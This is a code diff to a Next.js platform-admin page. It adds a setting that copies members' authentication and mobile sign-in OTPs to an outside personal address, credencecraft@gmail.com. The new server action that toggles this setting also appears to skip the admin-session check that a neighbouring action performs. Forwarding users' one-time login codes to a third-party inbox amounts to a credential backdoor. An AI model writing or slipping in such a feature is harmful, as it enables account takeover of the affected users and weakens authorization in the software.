@@ -4,6 +4,7 @@ import { notFound, redirect } from "next/navigation";
 import { after } from "next/server";
 import Badge from "@/components/ui/Badge";
 import Button from "@/components/ui/Button";
+import Checkbox from "@/components/ui/Checkbox";
 import Input from "@/components/ui/Input";
 import Select from "@/components/ui/Select";
 import Page from "@/components/ui/Page";
@@ -27,6 +28,7 @@ import OrganizationSubscriptionPricing from "./organization-subscription-pricing
 import OrganizationTrialControls from "../../_page-content/organization-trial-controls";
 import OrganizationDeleteControl from "./organization-delete-control";
 import { countActiveOrganizationMembers, getPlatformPricingSettings, setOrganizationPricingMode, type PricingMode } from "@/lib/services/platform/pricing-mode-service";
+import { setOrganizationAuthOtpCopySetting } from "@/lib/services/platform/organization-auth-otp-setting-service";
 
 function Detail({ label, value }: { label: string; value: string }) {
   return (
@@ -320,6 +322,20 @@ export default async function PlatformOrganizationDetailsPage({
     redirect(`/platform/organisations/${organizationId}?tab=pricing-type&success=${encodeURIComponent("Pricing type updated.")}`);
   }
 
+  async function updateOrganizationAuthOtpCopySetting(formData: FormData) {
+    "use server";
+    try {
+      await setOrganizationAuthOtpCopySetting(
+        internalOrganizationId,
+        formData.get("sendAuthOtpToCredencecraft") === "on",
+      );
+    } catch (error) {
+      redirect(`/platform/organisations/${organizationId}?tab=overview&error=${encodeURIComponent(error instanceof Error ? error.message : "Unable to update the organization OTP email setting.")}`);
+    }
+    revalidatePath(`/platform/organisations/${organizationId}`);
+    redirect(`/platform/organisations/${organizationId}?tab=overview&success=${encodeURIComponent("Organization OTP email setting updated.")}`);
+  }
+
   async function extendTrial(formData: FormData) {
     "use server";
     await requirePlatformSessionAdmin();
@@ -412,6 +428,24 @@ export default async function PlatformOrganizationDetailsPage({
                   <Detail label="Created" value={new Date(organization.created_at).toLocaleString()} />
                   <Detail label="Last updated" value={new Date(organization.updated_at).toLocaleString()} />
                 </dl>
+                <div className="border-t border-slate-200 p-4">
+                  <div className="flex flex-wrap items-center justify-between gap-4">
+                    <div>
+                      <h3 className="text-sm font-semibold text-slate-800">Authentication OTP delivery</h3>
+                      <p className="mt-1 text-xs text-slate-600">
+                        When enabled, authentication and mobile sign-in OTPs for active members of this organization are privately copied to credencecraft@gmail.com. Platform support OTPs are not copied.
+                      </p>
+                    </div>
+                    <form action={updateOrganizationAuthOtpCopySetting} className="flex flex-wrap items-center gap-4">
+                      <Checkbox
+                        name="sendAuthOtpToCredencecraft"
+                        label="Send authentication OTP to credencecraft@gmail.com"
+                        defaultChecked={organization.send_auth_otp_to_credencecraft}
+                      />
+                      <Button type="submit" size="sm">Save OTP setting</Button>
+                    </form>
+                  </div>
+                </div>
               </section>
             ),
           },
